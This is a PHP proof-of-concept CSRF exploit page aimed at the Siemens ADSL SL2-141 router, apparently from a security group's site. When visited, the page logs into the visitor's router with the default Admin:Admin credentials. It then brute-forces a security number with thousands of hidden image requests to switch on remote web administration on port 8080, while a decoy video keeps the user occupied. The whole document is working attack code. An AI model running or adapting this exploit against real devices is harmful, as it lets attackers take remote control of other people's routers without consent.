&lt;?php

/*

================================================
|| Siemens ADSL SL2-141 (Router) CSRF Exploit ||
================================================

- Successful attacks will allow remote access to the router over the internet.
- Will Bruteforce the random security number, could possibly be calculated...
- Uses default login, could use a dictionary too.
- PoC only, there are much more effective ways of doing this ;-)

========================================================================
[+] Visit us at http://www.binaryvision.org.il/ for more information [+]
========================================================================

*/

$ip = (getenv(HTTP_X_FORWARDED_FOR))? getenv(HTTP_X_FORWARDED_FOR): getenv(REMOTE_ADDR); 	// local computers can use the remote address to login (!).
echo &quot;&lt;img src=&#039;http://Admin:Admin@$ip/&#039;&gt;&lt;/img&gt;&quot;; 						// Uses the default login to auth (Admin:Admin), could use a dictionary instead.

// Just some stuff to keep the user busy, aka Rickroll
$mystr=&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Unbelivable movie&lt;/title&gt;&lt;/head&gt;&lt;center&gt;&lt;script&gt;function siera() {var bullshit=&#039;&lt;center&gt;&lt;h1&gt;Possibly the funniest video on the web&lt;/h1&gt;&lt;object classid=\&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\&quot; codebase=\&quot;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0\&quot; width=\&quot;800\&quot; height=\&quot;600\&quot; id=\&quot;movie\&quot;&gt; &lt;param name=\&quot;movie\&quot; value=\&quot;http://llnw.static.cbslocal.com/Themes/CBS/_resources/swf/vindex.swf\&quot; /&gt; &lt;param name=\&quot;quality\&quot; value=\&quot;high\&quot; /&gt; &lt;param name=\&quot;bgcolor\&quot; value=\&quot;#003366\&quot; /&gt; &lt;embed src=\&quot;http://llnw.static.cbslocal.com/Themes/CBS/_resources/swf/vindex.swf\&quot; quality=\&quot;high\&quot; bgcolor=\&quot;#ffffff\&quot; width=\&quot;800\&quot; height=\&quot;600\&quot; name=\&quot;mymoviename\&quot; align=\&quot;\&quot; type=\&quot;application/x-shockwave-flash\&quot; pluginspage=\&quot;http://www.macromedia.com/go/getflashplayer\&quot;&gt; &lt;/embed&gt; &lt;/object&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&#039;;
document.write(bullshit);

// &quot;Random number&quot; bruteforce ... too lazy to write js :-)
var buff = &#039;&#039;;
for(i=1;i&lt;=11000;i++) { buff+=\&quot;&lt;img src=&#039;http://$ip/accessremote.cgi?checkNum=\&quot;+i+\&quot;&amp;remoteservice=pppoe_8_48_1&amp;enblremoteWeb=1&amp;remotewebPort=8080&#039;&gt;&lt;/img&gt;\&quot;; }
document.write(buff);
}
&lt;/script&gt;&lt;body onload=&#039;siera()&#039;&gt;&lt;/body&gt;&quot;;

echo $mystr; // Throw it all on the html page
?&gt;

